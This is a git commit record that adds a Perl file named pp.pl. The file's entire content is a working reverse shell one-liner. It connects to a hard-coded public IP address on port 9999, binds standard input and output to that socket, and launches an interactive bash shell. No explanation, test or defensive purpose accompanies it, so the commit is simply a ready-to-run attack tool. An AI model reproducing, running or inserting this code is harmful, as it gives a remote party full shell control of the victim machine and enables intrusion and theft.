74fe53c99964ab2029735872e501fa50892bc49b
eviloH <41788689+eviloH@users.noreply.github.com>
2020-04-09 10:37:12 +0800

    Create pp.pl

---
+++ pp.pl
@@ -0,0 +1,3 @@
+#!/usr/bin/perl
+
+use Socket;$i="47.99.215.95";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};
